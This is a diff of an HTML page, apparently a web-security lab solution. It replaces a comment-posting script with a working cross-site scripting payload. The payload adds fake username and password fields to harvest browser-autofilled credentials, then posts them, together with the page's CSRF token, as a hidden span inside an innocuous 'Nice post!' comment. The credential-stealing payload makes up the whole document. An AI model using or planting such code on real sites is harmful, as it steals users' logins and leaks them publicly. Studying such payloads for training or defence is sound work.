@@ -1,4 +1,4 @@
-<script>
+<!-- <script>
     window.addEventListener("DOMContentLoaded",function () {
         var form = document.querySelector('.add-comment form');
 
@@ -17,4 +17,30 @@
             credentials:"include"
         })
     })
+</script> -->
+
+<input type="text" name="username">
+<input type="password" name="password" onchange="atack()">
+<script>
+    function atack () {
+        
+        var token = document.getElementsByName("csrf")[0].value;
+        var postId = document.getElementsByName("postId")[0].value;
+        var username = document.getElementsByName("username")[0].value;
+        var password = document.getElementsByName("password")[0].value;
+        var data = new FormData();
+        
+        data.append('csrf',token);
+        data.append('postId',postId);
+        data.append('comment',"<span style='display:none'>"+`${username} : ${password}`+"</span> Nice post!" );
+        data.append('name','victim');
+        data.append('email','test@me.com');
+        data.append('website','http://test');
+        
+        fetch('/post/comment',{
+            method:"POST",
+            mode:"no-cors",
+            body:data,
+        })
+    }
 </script>
